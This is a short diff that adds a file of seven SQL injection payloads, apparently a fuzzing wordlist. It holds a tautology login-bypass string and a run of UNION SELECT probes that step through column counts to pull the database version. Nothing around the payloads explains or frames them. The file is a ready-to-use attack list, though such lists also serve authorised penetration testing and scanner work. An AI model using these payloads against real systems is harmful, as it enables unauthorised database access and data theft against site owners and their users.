@@ -1,0 +1,7 @@
+' or 1=1 --
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
